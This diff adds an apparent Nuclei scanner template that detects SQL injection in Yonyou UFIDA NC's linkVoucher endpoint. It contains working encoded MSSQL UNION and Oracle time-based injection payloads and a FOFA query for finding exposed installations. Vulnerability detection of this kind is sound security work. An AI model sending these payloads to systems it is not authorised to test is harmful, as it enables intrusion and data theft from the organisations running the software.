@@ -1,0 +1,47 @@
+id: yonyou-nc-linkVoucher-sqli
+
+info:
+  name: 用友 UFIDA NC linkVoucher - sqli
+  author: leadlife
+  severity: high
+  description: 用友NC系统中的/portal/pt/yercommon/linkVoucher接口存在SQL注入漏洞，可能导致服务器数据泄露。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9FlinkVoucher%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md  
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou, sqli, nc, oa, time
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29%2CNULL--%20kugG&mssql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        @timeout: 15s
+        GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=%31%25%27%20%41%4e%44%20%35%36%39%35%3d%44%42%4d%53%5f%50%49%50%45%2e%52%45%43%45%49%56%45%5f%4d%45%53%53%41%47%45%28%43%48%52%28%31%30%37%29%7c%7c%43%48%52%28%31%30%30%29%7c%7c%43%48%52%28%31%31%31%29%7c%7c%43%48%52%28%31%30%31%29%2c%35%29%20%41%4e%44%20%27%71%70%4d%54%25%27%3d%27%71%70%4d%54&oracle HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains_all(body_1,"12321","fip_operatinglog")
+
+      - type: dsl
+        dsl:
+          - status_code_2 == 200 && duration_2 > 5 && contains_all(body_2,'src_relationid')
+
+
